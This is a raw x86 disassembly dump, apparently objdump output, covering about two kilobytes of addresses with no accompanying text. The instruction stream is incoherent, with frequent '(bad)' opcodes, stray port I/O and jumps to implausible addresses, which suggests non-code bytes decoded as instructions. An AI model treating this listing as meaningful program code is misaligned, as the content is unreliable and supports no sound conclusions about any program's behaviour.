  4210af:	addr16 add eax,0x4e276ae3
  4210b5:	in     eax,dx
  4210b6:	inc    ebp
  4210b7:	jle    0x4210b7
  4210b9:	clc    
  4210ba:	aad    0x6d
  4210bc:	xchg   ecx,eax
  4210bd:	dec    ebx
  4210be:	aaa    
  4210bf:	(bad)  
  4210c0:	push   DWORD PTR [edx]
  4210c2:	sub    al,0x4f
  4210c4:	ret    0x170e
  4210c7:	pop    edi
	...
  4210d0:	add    BYTE PTR [edx+0x70],cl
  4210d3:	fdivr  DWORD PTR [edx+edi*8-0x4]
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	push   cs
  4210de:	(bad)  
  4210df:	jnp    0x4210da
  4210e1:	out    0x8a,eax
  4210e3:	add    DWORD PTR [eax],eax
  4210e5:	scas   eax,DWORD PTR es:[edi]
  4210e6:	add    eax,DWORD PTR [eax]
  4210e8:	add    BYTE PTR [ebp+0x19dd450f],ah
  4210ee:	jno    0x42116d
  4210f0:	call   0xbec2754d
  4210f5:	ret    0x883f
  4210f8:	and    esp,esp
  4210fa:	mov    ebx,0xaea4684f
  4210ff:	mov    bh,0xef
  421101:	mov    cs,WORD PTR [eax+eiz*4-0x3f]
  421105:	fst    QWORD PTR ds:0x5366a392
  42110b:	bound  ebp,QWORD PTR [edi]
  42110d:	xor    BYTE PTR [eax-0x10],bl
  421110:	addr16 loop 0x4210f7
  421113:	ins    DWORD PTR es:[edi],dx
  421114:	xchg   edx,eax
  421115:	loopne 0x4210f7
  421117:	push   0x3dd9c9a1
  42111c:	push   es
  42111d:	sbb    BYTE PTR [ebp-0x46],cl
  421120:	mov    cs,WORD PTR [edx-0x5c5843b2]
  421126:	jg     0x421126
  421128:	push   ds
  421129:	xchg   ecx,eax
  42112a:	mov    ds:0x8cb2e8b,eax
  42112f:	add    al,0x2f
  421131:	sub    DWORD PTR ds:0xa227884a,ebx
  421137:	xchg   DWORD PTR [ecx-0x2e],esi
  42113a:	inc    ebp
  42113b:	or     DWORD PTR [eax],esi
  42113d:	push   esp
  42113e:	adc    BYTE PTR [ecx+0x2e2fcc85],bh
  421144:	inc    ebx
  421145:	dec    esp
  421146:	sbb    cl,BYTE PTR [esi-0x1a4c723c]
  42114c:	shl    DWORD PTR [edx-0x57],1
  42114f:	mov    ecx,0x23669bee
  421154:	aam    0x4
  421156:	aad    0xfc
  421158:	jb     0x42118c
  42115a:	ror    DWORD PTR [ebp+0x4d275a1e],cl
  421160:	pop    eax
  421161:	xchg   ebx,eax
  421162:	jle    0x4211ca
  421164:	aad    0x83
  421166:	aad    0x68
  421168:	pop    es
  421169:	mov    ebp,0x852a577d
  42116e:	mov    esp,0x8ba5c998
  421173:	hlt    
  421174:	add    al,0xf7
  421176:	pop    ecx
  421177:	sbb    bh,BYTE PTR [esi-0x24]
  42117a:	mov    ah,0xd0
  42117c:	push   es
  42117d:	shl    BYTE PTR [eax+edx*8+0xe],1
  421181:	retf   
  421182:	aad    0x92
  421184:	shr    BYTE PTR [ecx],0xd2
  421187:	or     esi,DWORD PTR [eax-0xc]
  42118a:	ds int 0xfb
  42118d:	lea    esi,[ecx+0x55]
  421190:	ret    
  421191:	push   edi
  421192:	std    
  421193:	les    esp,FWORD PTR [edi-0x1ce890a5]
  421199:	pop    ss
  42119a:	shl    bh,1
  42119c:	aam    0x2a
  42119e:	pushf  
  42119f:	scas   eax,DWORD PTR es:[edi]
  4211a0:	lds    eax,FWORD PTR [esi-0x7c9a4272]
  4211a6:	pop    ebp
  4211a7:	retf   
  4211a8:	dec    edi
  4211a9:	mov    ebp,0x79fc5045
  4211ae:	mov    cl,0x94
  4211b0:	xlat   BYTE PTR ds:[ebx]
  4211b1:	push   0x42
  4211b3:	inc    BYTE PTR [ebx+0xf4bd57d]
  4211b9:	mov    dl,BYTE PTR [edx+0x74]
  4211bc:	dec    ecx
  4211bd:	rol    BYTE PTR [ebx+0x32],cl
  4211c0:	mov    ch,0x47
  4211c2:	mov    ebx,0x430f2210
  4211c7:	out    0x6c,eax
  4211c9:	stc    
  4211ca:	and    al,0x74
  4211cc:	mov    eax,DWORD PTR [eax-0x37d6eeee]
  4211d2:	jmp    0x42120b
  4211d4:	adc    DWORD PTR [edi-0x38d10d28],edx
  4211da:	push   0x55
  4211dc:	mov    edx,0x18f6d7c3
  4211e1:	push   es
  4211e2:	mov    ecx,DWORD PTR [eax]
  4211e4:	test   DWORD PTR ds:0xfe6fa61a,edi
  4211ea:	xchg   ebp,eax
  4211eb:	arpl   WORD PTR [edi+eax*8-0x305da3ea],bp
  4211f2:	add    ah,ch
  4211f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211f5:	or     al,0x4c
  4211f7:	mov    al,ds:0x4da32936
  4211fc:	mov    al,ds:0x93c00ebf
  421201:	in     al,dx
  421202:	xchg   cl,al
  421204:	push   eax
  421205:	push   ebx
  421206:	shr    DWORD PTR [ecx+0x65],cl
  421209:	out    0x5d,ax
  42120c:	loop   0x42121c
  42120e:	nop
  42120f:	sbb    eax,0x427a3442
  421214:	sub    al,0x6b
  421217:	icebp  
  421218:	pop    ss
  421219:	inc    edx
  42121a:	mov    edi,0x7ad614f2
  42121f:	mov    bh,0x50
  421221:	in     eax,dx
  421222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421223:	mov    DWORD PTR [ebp+0x1a098be7],ecx
  421229:	xchg   esi,eax
  42122a:	jo     0x4211f7
  42122c:	clc    
  42122d:	bound  esi,QWORD PTR [edx]
  42122f:	add    bl,BYTE PTR [edi-0x67fb3e9d]
  421235:	inc    eax
  421236:	xchg   edi,eax
  421237:	call   0xea36:0xd567f82f
  42123e:	bound  esp,QWORD PTR [edi+0x6be27733]
  421244:	mov    esp,edx
  421246:	add    ebx,DWORD PTR [edx-0x47bf1e07]
  42124c:	jmp    0x4305a101
  421251:	aaa    
  421252:	adc    al,BYTE PTR [eax+0x7f164bed]
  421258:	add    cl,0x46
  42125b:	aad    0xe4
  42125d:	mov    al,BYTE PTR [edx-0x16791a5a]
  421263:	or     eax,DWORD PTR [eax]
  421265:	stos   DWORD PTR es:[edi],eax
  421266:	jmp    DWORD PTR [ebx-0x60b4ac06]
  42126c:	sub    al,0xb4
  42126e:	jmp    0x7e929a6b
  421273:	les    ecx,FWORD PTR [ebp-0x4c]
  421276:	push   eax
  421277:	aad    0x45
  421279:	add    DWORD PTR [eax-0x64d9e3d5],0x3e
  421280:	xlat   BYTE PTR ds:[ebx]
  421281:	ja     0x42123c
  421283:	test   al,0x6e
  421285:	jns    0x42120f
  421287:	jbe    0x421244
  421289:	gs clc 
  42128b:	mov    ecx,0x54ec108
  421290:	mov    al,ds:0x402eb78b
  421295:	sbb    bl,BYTE PTR [ecx]
  421297:	(bad)  
  421298:	retf   
  421299:	add    DWORD PTR [eax+ecx*1-0x71],ebx
  42129d:	lea    edi,[ebx-0x5110b9f7]
  4212a3:	outs   dx,DWORD PTR ds:[esi]
  4212a4:	inc    eax
  4212a5:	sbb    DWORD PTR [ebx+0x12],ebx
  4212a8:	xlat   BYTE PTR ds:[ebx]
  4212a9:	push   ss
  4212aa:	stos   BYTE PTR es:[edi],al
  4212ab:	dec    edx
  4212ac:	jle    0x4212a5
  4212ae:	push   ebx
  4212af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212b0:	pop    ebx
  4212b1:	lods   eax,DWORD PTR ds:[esi]
  4212b2:	fdivrp st(2),st
  4212b4:	cdq    
  4212b5:	pop    ebx
  4212b6:	gs pop ds
  4212b8:	xchg   ecx,eax
  4212b9:	in     al,0xc1
  4212bb:	not    BYTE PTR [eax]
  4212bd:	push   esp
  4212be:	push   0xffffff9b
  4212c0:	or     al,0xf3
  4212c2:	test   bh,bh
  4212c4:	push   cs
  4212c5:	rcl    DWORD PTR [edx],cl
  4212c7:	mov    ecx,0x9414ab76
  4212cc:	mov    bl,0x72
  4212ce:	(bad)  
  4212cf:	pop    ebx
  4212d0:	loopne 0x4212fd
  4212d2:	ficom  DWORD PTR [ebx-0x4f]
  4212d5:	xor    esi,DWORD PTR [edi]
  4212d7:	mov    esi,0x71e3a005
  4212dc:	aaa    
  4212dd:	cli    
  4212de:	fcmove st,st(4)
  4212e0:	jmp    0x4212ea
  4212e2:	sub    BYTE PTR ds:0x1d82bd41,bh
  4212e8:	mov    bh,0x35
  4212ea:	dec    esi
  4212eb:	inc    eax
  4212ec:	out    0x91,al
  4212ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ef:	mov    dl,0xb5
  4212f1:	mov    ah,0xfd
  4212f3:	dec    edx
  4212f4:	pop    ebp
  4212f5:	test   BYTE PTR ds:0x33786d7e,0x2f
  4212fc:	jno    0x4212ac
  4212fe:	popf   
  4212ff:	loope  0x42137e
  421301:	inc    esi
  421302:	sub    cl,dl
  421304:	add    ebx,esi
  421306:	xor    cl,cl
  421308:	mov    ds:0x9bcccf46,al
  42130d:	cmp    ah,BYTE PTR [edx-0x46]
  421310:	xor    eax,0xf72dfcd2
  421315:	push   edx
  421316:	or     cl,BYTE PTR [ecx]
  421318:	pop    es
  421319:	js     0x4212b8
  42131b:	cmp    DWORD PTR [edx],eax
  42131d:	loope  0x42131e
  42131f:	test   DWORD PTR [edi-0x47],esp
  421322:	cmp    eax,0xd0022bd1
  421327:	inc    ebp
  421328:	pop    ds
  421329:	outs   dx,BYTE PTR ds:[esi]
  42132a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42132b:	xor    al,0x85
  42132d:	and    eax,0x42a7f589
  421332:	xchg   DWORD PTR [esi-0x5a1789f5],esi
  421338:	jno    0x42130c
  42133a:	sbb    al,0x12
  42133c:	and    BYTE PTR [ecx+0x59],dh
  42133f:	lods   eax,DWORD PTR ds:[esi]
  421340:	sub    DWORD PTR cs:[ebp+0x18],esi
  421344:	mov    ecx,0x9424f4a
  421349:	add    al,BYTE PTR ss:[ebx]
  42134c:	cli    
  42134d:	jl     0x421392
  42134f:	rol    BYTE PTR [ebp+0x6d],0xd3
  421353:	fs adc al,0x88
  421356:	cmp    eax,0x9e2a8b7f
  42135b:	imul   eax,DWORD PTR [ebp+0x13145001],0xd5c99ad
  421365:	pop    edx
  421366:	stos   BYTE PTR es:[edi],al
  421367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421368:	test   eax,0x5c9e9761
  42136d:	push   ds
  42136e:	mov    ebx,0x8f97d67f
  421373:	cmp    eax,0x92ff2977
  421378:	cli    
  421379:	push   cs
  42137a:	int    0x1e
  42137c:	xchg   ecx,eax
  42137d:	adc    eax,0x1debf73a
  421382:	push   ebp
  421383:	aam    0x6d
  421385:	dec    ebp
  421386:	shl    BYTE PTR [edi-0x6f],0x73
  42138a:	mov    ds:0x28a4d3a8,al
  42138f:	retf   0xe7aa
  421392:	ins    DWORD PTR es:[edi],dx
  421393:	loopne 0x4213c6
  421395:	ret    
  421396:	bound  esp,QWORD PTR [edx]
  421398:	add    BYTE PTR [edi-0x27],bl
  42139b:	or     al,0x17
  42139d:	push   ecx
  42139e:	add    esp,DWORD PTR [esi]
  4213a0:	loope  0x42138f
  4213a2:	ss mov bh,0x39
  4213a5:	sahf   
  4213a6:	add    ch,ch
  4213a8:	js     0x421377
  4213aa:	shl    DWORD PTR [ecx-0x31c43e36],0x22
  4213b1:	inc    eax
  4213b2:	push   edi
  4213b3:	jns    0x4213d8
  4213b5:	aam    0xbc
  4213b7:	sbb    edx,DWORD PTR [edi+0x7d343039]
  4213bd:	ret    0xbaa1
  4213c0:	loopne 0x421420
  4213c2:	jno    0x4213ea
  4213c4:	dec    edx
  4213c5:	lods   eax,DWORD PTR ds:[esi]
  4213c6:	aam    0x79
  4213c8:	adc    DWORD PTR [eax-0x2c9fa1dd],ebx
  4213ce:	mov    bl,BYTE PTR [ebx+ebp*2-0x2b5d7dab]
  4213d5:	mov    esp,0xc7a8e748
  4213da:	or     al,0x57
  4213dc:	popa   
  4213dd:	icebp  
  4213de:	cmp    al,0x8
  4213e0:	fdivr  QWORD PTR ds:0xe64e27ff
  4213e6:	(bad)  
  4213e7:	clc    
  4213e8:	sbb    ebp,eax
  4213ea:	add    al,BYTE PTR [ecx-0x29ac2d02]
  4213f0:	cwde   
  4213f1:	shr    DWORD PTR [esi-0x1c0f29d3],0x5f
  4213f8:	enter  0x96e2,0x2f
  4213fc:	mov    dl,0x9a
  4213fe:	retf   
  4213ff:	ror    ebx,0x4f
  421402:	mov    ch,BYTE PTR [eiz*1+0x5a520103]
  421409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42140a:	mov    BYTE PTR [edi-0x6ed27ff2],dl
  421410:	lds    eax,FWORD PTR [esi-0x6969d763]
  421416:	push   eax
  421417:	and    BYTE PTR [ebx+0x33],dl
  42141a:	addr16 gs jns 0x4213f0
  42141e:	pusha  
  42141f:	xor    al,0x57
  421421:	inc    eax
  421422:	cwde   
  421423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421424:	pusha  
  421425:	(bad)  
  421427:	cmp    DWORD PTR [ebp+0x4761ed7c],ebx
  42142d:	dec    edi
  42142e:	jmp    0x421431
  421430:	loop   0x421410
  421432:	sbb    WORD PTR [ebx+0x36],cx
  421436:	aaa    
  421437:	not    DWORD PTR [esi+0x7e291998]
  42143d:	shr    BYTE PTR [edi+0x2b],1
  421440:	inc    ecx
  421441:	dec    ebp
  421442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421443:	mov    ?,WORD PTR [edx+eax*2]
  421446:	lods   eax,DWORD PTR ds:[esi]
  421447:	push   0xffffffd5
  421449:	lods   al,BYTE PTR ds:[esi]
  42144a:	retf   0x78c2
  42144d:	jmp    0x4213f3
  42144f:	in     al,dx
  421450:	lds    edx,FWORD PTR [ecx-0x67]
  421453:	xlat   BYTE PTR ds:[ebx]
  421454:	pop    edi
  421455:	push   ds
  421456:	jl     0x421436
  421458:	mov    DWORD PTR [esp+ebx*2+0x2b232c36],ebx
  42145f:	out    0x44,eax
  421461:	fwait
  421462:	jb     0x42140b
  421464:	sub    al,0x1a
  421466:	push   ecx
  421467:	ret    0x353
  42146a:	mov    ah,0xd4
  42146c:	pusha  
  42146d:	(bad)  
  42146e:	pop    esi
  42146f:	push   ecx
  421470:	pop    ebx
  421471:	adc    al,0x55
  421473:	push   cs
  421474:	pushf  
  421475:	and    BYTE PTR [ecx+edi*2],cl
  421478:	jecxz  0x42142a
  42147a:	pop    ebx
  42147b:	xchg   ecx,eax
  42147c:	add    ebx,edx
  42147e:	outs   dx,DWORD PTR ds:[esi]
  42147f:	xchg   edx,eax
  421480:	xor    BYTE PTR [edi],al
  421482:	fsub   QWORD PTR [esi+0x67245036]
  421488:	or     DWORD PTR [ebx-0x57],ebp
  42148b:	inc    esp
  42148c:	add    esi,DWORD PTR [ecx+0x5]
  42148f:	(bad)  
  421490:	sti    
  421491:	test   BYTE PTR [ebp+0xb],0x8f
  421495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421496:	jb     0x4214ac
	...
  4214a0:	add    BYTE PTR [ebp-0x2c737c23],cl
  4214a6:	fimul  WORD PTR [edi-0x66af6223]
  4214ac:	daa    
  4214ad:	ror    BYTE PTR [ebx+0x30],0xfe
  4214b1:	xchg   esi,eax
  4214b2:	mov    es,WORD PTR [ecx]
  4214b4:	add    BYTE PTR [edi+0x2e000003],ch
  4214ba:	pop    ds
  4214bb:	std    
  4214bc:	inc    ecx
  4214bd:	xor    DWORD PTR [bx+si-0x69db],ebx
  4214c2:	push   ss
  4214c3:	cmp    al,0x8a
  4214c5:	adc    al,0x32
  4214c7:	and    BYTE PTR [edx+eiz*4+0x79e9f90b],ah
  4214ce:	cwde   
  4214cf:	dec    eax
  4214d0:	mov    al,0xec
  4214d2:	and    ch,BYTE PTR [ecx+0x68]
  4214d5:	cmp    al,0xc3
  4214d7:	frstor [ebx-0x46]
  4214da:	pop    ds
  4214db:	jo     0x42151b
  4214dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214de:	mov    ebp,0x96312e1a
  4214e3:	push   eax
  4214e4:	ins    DWORD PTR es:[edi],dx
  4214e5:	jne    0x421474
  4214e7:	mov    esp,0x23f7cf5d
  4214ec:	aad    0xcc
  4214ee:	call   0xc96dbeb0
  4214f3:	imul   ecx,DWORD PTR [esi+0x6061e6f6],0xffffffd1
  4214fa:	cdq    
  4214fb:	sbb    eax,0xa2dd1ecc
  421500:	jecxz  0x421578
  421502:	jmp    0xababe712
  421507:	push   ebp
  421508:	jno    0x4214c9
  42150a:	(bad)  
  42150b:	repz xor BYTE PTR [eax+0x2c7708db],cl
  421512:	jo     0x421546
  421514:	inc    esp
  421515:	test   al,0xfb
  421517:	push   edx
  421518:	and    al,0x12
  42151a:	lds    edx,FWORD PTR [ecx+0x1692a89b]
  421520:	gs cld 
  421522:	ret    0x6ea1
  421525:	and    BYTE PTR ds:0x67dc8cf4,dl
  42152b:	pop    ecx
  42152c:	cmp    eax,0x62c40feb
  421531:	pop    edi
  421532:	es hlt 
  421534:	or     al,0x49
  421536:	sub    bl,ah
  421538:	sbb    eax,DWORD PTR [esi+0x40]
  42153b:	clc    
  42153c:	dec    ecx
  42153d:	imul   DWORD PTR [edi-0x6fc53094]
  421543:	or     al,0x48
  421545:	out    0xd6,al
  421547:	test   al,0xd8
  421549:	fidivr DWORD PTR [ebx+0x7e]
  42154d:	jno    0x4214fc
  42154f:	add    al,0x3b
  421551:	lods   al,BYTE PTR ds:[esi]
  421552:	mov    dh,0x9c
  421554:	or     ch,BYTE PTR [edi+0xfb66e6f]
  42155a:	std    
  42155b:	clc    
  42155c:	sub    ah,0xe9
  42155f:	lods   eax,DWORD PTR ds:[esi]
  421560:	fmul   st,st(2)
  421562:	add    DWORD PTR [ebp-0x28],ebp
  421565:	mov    esi,0x5292301
  42156a:	xchg   BYTE PTR gs:0xadfc45d,al
  421571:	push   ebp
  421572:	or     DWORD PTR [esi],edx
  421574:	out    0x27,eax
  421576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421577:	mov    ebp,0xe19bcf64
  42157c:	int3   
  42157d:	sbb    DWORD PTR [esi-0x22],edx
  421580:	ins    BYTE PTR es:[edi],dx
  421581:	sbb    ch,cl
  421583:	jecxz  0x421575
  421585:	cmp    esp,esp
  421587:	sbb    DWORD PTR [ebp+0x6b],ecx
  42158a:	inc    esp
  42158b:	xor    eax,0xcbca5557
  421590:	mov    DWORD PTR ss:[edx],eax
  421593:	out    0x49,al
  421595:	push   esi
  421596:	pop    esi
  421597:	sar    BYTE PTR [esp+ebx*1],0xc6
  42159b:	minps  xmm1,xmm7
  42159e:	mov    edx,0x79bf160d
  4215a3:	ins    DWORD PTR es:[edi],dx
  4215a4:	pop    ebx
  4215a5:	int    0x24
  4215a7:	pop    edi
  4215a8:	sbb    BYTE PTR [ebx],0x54
  4215ab:	std    
  4215ac:	inc    esp
  4215ad:	(bad)  
  4215ae:	imul   ebp,DWORD PTR [eax+0xd79149a],0xd1764a1b
  4215b8:	je     0x4215ae
  4215ba:	pop    ss
  4215bb:	sbb    BYTE PTR [edx-0x61],ch
  4215be:	cmp    al,0xb6
  4215c0:	sbb    ebp,esi
  4215c2:	pop    gs
  4215c4:	push   esp
  4215c5:	cmp    BYTE PTR [edi],al
  4215c7:	loop   0x4215a3
  4215c9:	mov    ecx,0xb7be5173
  4215ce:	xchg   edx,eax
  4215cf:	stos   BYTE PTR es:[edi],al
  4215d0:	mov    dl,0x83
  4215d2:	cmp    al,0x1b
  4215d4:	lea    ecx,[edi]
  4215d6:	sbb    BYTE PTR ds:0xc6297397,dh
  4215dc:	inc    edi
  4215dd:	and    DWORD PTR [ebp-0x6],eax
  4215e0:	stos   DWORD PTR es:[edi],eax
  4215e1:	mov    bh,0xdd
  4215e3:	out    0xb2,al
  4215e5:	mov    edi,0xf000ea91
  4215ea:	dec    edx
  4215eb:	push   0x8cc79e04
  4215f0:	cmp    ah,bl
  4215f2:	pop    ebx
  4215f3:	lds    eax,FWORD PTR [edi+0x7857ebe9]
  4215f9:	xor    BYTE PTR ds:0xc40bb7d2,cl
  4215ff:	(bad)  
  421601:	and    DWORD PTR [edi-0xd3b7032],esp
  421607:	mov    ecx,0x81fe7419
  42160c:	mov    edi,0xdabc26c6
  421611:	xor    dl,BYTE PTR [edi+0x4df6fe7b]
  421617:	in     eax,dx
  421618:	adc    DWORD PTR [eax-0x75],eax
  42161b:	loope  0x4215c3
  42161d:	ja     0x4215c5
  42161f:	pop    ebx
  421620:	mov    dh,0xc8
  421622:	add    ecx,eax
  421624:	xor    BYTE PTR [ebx],bl
  421626:	arpl   WORD PTR [ecx-0x39a5c8fa],ax
  42162c:	out    0x4b,eax
  42162e:	mov    ds:0x20a710e3,al
  421633:	dec    ebp
  421634:	sbb    cl,bl
  421636:	and    edi,edx
  421638:	out    0xf0,eax
  42163a:	xor    dl,bh
  42163c:	sti    
  42163d:	loopne 0x421602
  42163f:	clflush BYTE PTR [edx+0x1222e705]
  421646:	mov    esi,0xeb18d4c1
  42164b:	call   0xb383:0x3beda85
  421652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421653:	out    dx,eax
  421654:	lock gs mov cl,0x91
  421658:	adc    ecx,DWORD PTR [edx-0x69320980]
  42165e:	mov    ebx,0x3d9ee9d
  421663:	retf   
  421664:	(bad)  
  421667:	lea    edx,[edi]
  421669:	and    ecx,0xc512ba78
  42166f:	and    al,0x7f
  421671:	push   esp
  421672:	jns    0x421637
  421674:	rcl    BYTE PTR [edx+ebp*8],cl
  421677:	adc    al,0xcd
  421679:	cs jle 0x42164d
  42167c:	dec    eax
  42167d:	js     0x421652
  42167f:	push   edi
  421680:	cmc    
  421681:	(bad)  
  421682:	push   0xaaf8f756
  421687:	xchg   ebp,eax
  421688:	out    dx,al
  421689:	retf   
  42168a:	pushf  
  42168b:	pop    esp
  42168c:	or     al,0xfc
  42168e:	lds    eax,FWORD PTR [esi]
  421690:	call   0x854ea25c
  421695:	push   esp
  421696:	push   cs
  421697:	xor    ecx,ebx
  421699:	mov    edx,0x7b0ad59d
  42169e:	push   cs
  42169f:	in     eax,dx
  4216a0:	cmp    al,0x30
  4216a2:	xor    ebx,esi
  4216a4:	sahf   
  4216a5:	loopne 0x421721
  4216a7:	adc    esp,DWORD PTR [eax+0x22]
  4216aa:	or     ah,BYTE PTR [ebp-0x72]
  4216ad:	dec    ebp
  4216ae:	inc    BYTE PTR [ecx]
  4216b0:	sbb    edi,eax
  4216b2:	add    eax,0x641e1d13
  4216b7:	sbb    BYTE PTR [eax-0x73],al
  4216ba:	xchg   esp,eax
  4216bb:	dec    esi
  4216bc:	or     DWORD PTR [eax+0x46989d6e],0xe693afae
  4216c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216c7:	js     0x42166a
  4216c9:	xor    DWORD PTR [esi+0x20],ebx
  4216cc:	jb     0x42174a
  4216ce:	in     eax,0x93
  4216d0:	js     0x421682
  4216d2:	pop    eax
  4216d3:	jno    0x42167e
  4216d5:	mov    esi,0x96124e25
  4216da:	jb     0x42168e
  4216dc:	std    
  4216dd:	nop
  4216de:	adc    al,0x97
  4216e0:	stos   BYTE PTR es:[edi],al
  4216e1:	add    bl,BYTE PTR [eax-0xf549fd0]
  4216e7:	outs   dx,BYTE PTR ds:[esi]
  4216e8:	add    eax,0xf753bfd
  4216ed:	daa    
  4216ee:	das    
  4216ef:	xchg   esi,eax
  4216f0:	and    ecx,ecx
  4216f2:	mov    ah,0xc8
  4216f4:	push   0x3e
  4216f6:	mov    WORD PTR ds:[edx],?
  4216f9:	fldenv [edx+0x6f]
  4216fc:	cmc    
  4216fd:	push   eax
  4216fe:	ins    DWORD PTR es:[edi],dx
  4216ff:	adc    bl,dl
  421701:	push   ss
  421702:	push   ds
  421703:	test   al,0x1b
  421705:	ret    0x4e20
  421708:	push   ecx
  421709:	add    al,cl
  42170b:	clc    
  42170c:	add    al,0xc
  42170e:	clc    
  42170f:	ror    BYTE PTR [eax-0x35],1
  421712:	jle    0x421751
  421714:	mov    WORD PTR [esi+ebx*4+0x26355f92],es
  42171b:	cmp    eax,0xf4e2ac7f
  421720:	setg   BYTE PTR [ecx]
  421723:	mov    al,0x46
  421725:	cmp    al,0x8f
  421727:	xchg   ebp,eax
  421728:	outs   dx,DWORD PTR ds:[esi]
  421729:	je     0x4216c9
  42172b:	mov    ebp,0x35d9cd79
  421730:	push   es
  421731:	sub    al,0xfe
  421733:	retf   0x100d
  421736:	lods   eax,DWORD PTR ds:[esi]
  421737:	adc    dl,BYTE PTR [esi+ebp*1]
  42173a:	test   al,0xfa
  42173c:	adc    cl,al
  42173e:	and    cl,BYTE PTR [ebx-0x14dd82ec]
  421744:	mov    BYTE PTR [ebx+0x1185c265],al
  42174a:	mov    dl,0x2f
  42174c:	pop    ebx
  42174d:	imul   edi,DWORD PTR [eax-0x4],0x48
  421751:	iret   
  421752:	repz push esp
  421754:	mov    esp,0xfbe9fad
  421759:	cmp    BYTE PTR [edx],bh
  42175b:	xor    DWORD PTR [ebp*2+0x6eaf4bb0],ecx
  421762:	sahf   
  421763:	das    
  421764:	mov    edx,0xf9bc824b
  421769:	dec    ecx
  42176a:	inc    esp
  42176b:	xchg   esi,eax
  42176c:	into   
  42176d:	inc    edx
  42176e:	in     al,0xf0
  421770:	repnz mov ch,0x83
  421773:	sbb    BYTE PTR [eax+0x1d],cl
  421776:	add    DWORD PTR [ecx+0x64],ecx
  421779:	add    BYTE PTR [eax+0x1],ch
  42177c:	sti    
  42177d:	jns    0x421724
  42177f:	lahf   
  421780:	ss scas al,BYTE PTR es:[edi]
  421782:	out    0x11,al
  421784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421785:	mov    ecx,DWORD PTR [esi-0x61]
  421788:	je     0x421744
  42178a:	mov    edi,esp
  42178c:	mov    dh,0xd8
  42178e:	ds jp  0x421732
  421791:	jle    0x421740
  421793:	cmp    edi,0x56
  421796:	test   BYTE PTR [esi+0x311c9f15],cl
  42179c:	xchg   BYTE PTR [eax-0x24],bl
  42179f:	xchg   ebp,eax
  4217a0:	jb     0x4217f4
  4217a2:	add    al,0x8
  4217a4:	jnp    0x421779
  4217a6:	pop    es
  4217a7:	adc    dl,al
  4217a9:	mov    al,ah
  4217ab:	sub    BYTE PTR [ecx+0x21],0x60
  4217af:	or     ecx,0xd3c3766e
  4217b5:	sub    ecx,0x62
  4217b8:	mov    edi,0xc48e028
  4217bd:	mov    dh,0xb
  4217bf:	(bad)  
  4217c1:	setae  BYTE PTR [ecx-0x51]
  4217c5:	jmp    0x7d388eca
  4217ca:	sub    eax,DWORD PTR [esi]
  4217cc:	jne    0x42184d
  4217ce:	aad    0x95
  4217d0:	or     al,0x79
  4217d2:	mov    dh,0x0
  4217d4:	dec    ebp
  4217d5:	(bad)  
  4217d6:	(bad)  
  4217d7:	in     eax,dx
  4217d8:	test   BYTE PTR [edi-0x7e62b36b],dh
  4217de:	call   0xe36dd2d9
  4217e3:	stos   DWORD PTR es:[edi],eax
  4217e4:	jbe    0x4217c5
  4217e6:	and    dh,BYTE PTR [eax+0x6449e19]
  4217ec:	xchg   edi,eax
  4217ed:	nop
  4217ee:	loope  0x421787
  4217f0:	aaa    
  4217f1:	adc    BYTE PTR [ecx+0x2f],al
  4217f4:	enter  0x5342,0xb9
  4217f8:	icebp  
  4217f9:	jnp    0x421873
  4217fb:	mov    eax,DWORD PTR [ebx-0x122145fe]
  421801:	xchg   edx,eax
  421802:	clc    
  421803:	inc    ebx
  421804:	mov    dl,0xda
  421806:	retf   0x1007
  421809:	cli    
  42180a:	fst    QWORD PTR [edi+edi*1+0x62411094]
  421811:	test   dl,ch
  421813:	pop    ebx
  421814:	iret   
  421815:	push   edx
  421816:	pop    edi
  421817:	fidivr WORD PTR [edi]
  421819:	push   ebx
  42181a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42181b:	sub    al,BYTE PTR [esi]
  42181d:	fwait
  42181e:	lock xchg edi,eax
  421820:	cmc    
  421821:	mov    ebx,0x2ffd7bf5
  421826:	jnp    0x421855
  421828:	out    dx,al
  421829:	xor    DWORD PTR [ecx],ebp
  42182b:	mov    ds:0x2b47402a,al
  421830:	mov    esi,0x6033c8b8
  421835:	(bad)  
  421836:	jo     0x42182d
  421838:	mov    ah,ah
  42183a:	cmp    al,0xaa
  42183c:	test   eax,0x5ef8a885
  421841:	inc    ebx
  421842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421843:	pop    edx
  421844:	push   esp
  421845:	xchg   edx,eax
  421846:	jb     0x42181d
  421848:	aad    0x15
  42184a:	mov    esp,0x31c38949
  42184f:	jb     0x4217ee
  421851:	aam    0x56
  421853:	and    eax,0x9188be70
  421858:	mulps  xmm1,XMMWORD PTR [ebx+0x23f1f23a]
  42185f:	jb     0x42181e
  421861:	mov    bl,0x6e
  421863:	mov    bl,0x56
  421865:	xor    al,0x22
  421867:	add    al,0x0
	...
  421871:	ds inc esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    edi,esp
  42187e:	in     al,0x29
  421880:	adc    eax,DWORD PTR [ebp-0x6e]
  421883:	add    DWORD PTR [eax],eax
  421885:	scas   eax,DWORD PTR es:[edi]
  421886:	add    eax,DWORD PTR [eax]
  421888:	add    BYTE PTR [edi],bl
  42188a:	add    BYTE PTR [esi+edx*2],bh
  42188d:	dec    eax
  42188e:	cli    
